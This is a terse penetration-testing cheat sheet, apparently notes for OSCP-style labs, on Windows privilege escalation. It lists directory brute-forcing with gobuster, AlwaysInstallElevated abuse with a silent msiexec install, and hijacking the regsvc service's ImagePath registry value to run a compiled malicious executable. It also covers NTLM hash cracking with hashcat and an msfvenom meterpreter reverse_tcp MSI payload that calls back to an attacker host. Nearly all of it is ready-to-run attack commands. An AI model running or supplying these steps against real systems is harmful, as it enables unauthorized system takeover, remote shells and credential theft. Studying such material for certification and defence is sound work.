

-gobuster dir -u http://<ip>:80 -w <wordlist>  
 
-accesschk64.exe -wvu "<file location>"  
Registry PrivEsc-AlwaysInstallElevated  
reg query HKLM\Software\Policies\Microsoft\Windows\Installer  
reg query HKCU\Software\Policies\Microsoft\Windows\Installer  
msiexec /quiet /qn /i <msi location>
Get-Acl-Path hklm\System\CurrentControlSet\Services\regsvc | fl ~ (NT Authority\Interactive means user has "FullControl" over key)
reg add hklm\System\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d <malicious_filename> /f
sc start regsvc

-hashcat -m 1000 <hash> <wordlist>

msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f msi -o <filename>.msi
 
x86_64-w64-mingw32-gcc <filename>.c -o <filename>.exe
 
 #### Service Escalation through the registry
Get-Acl-Path hklm\System\CurrentControlSet\Services\regsvc | fl ~ (NT Authority\Interactive means user has "FullControl" over key)  
Download useradd.c to kali then compile - [https://github.com/codingo/OSCP-2/blob/master/Windows/useradd.c](https://github.com/codingo/OSCP-2/blob/master/Windows/useradd.c)  
x86_64-w64-mingw32-gcc useradd.c -o mycode.exe  
reg add hklm\System\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\mycode.exe /f  
sc start regsvc
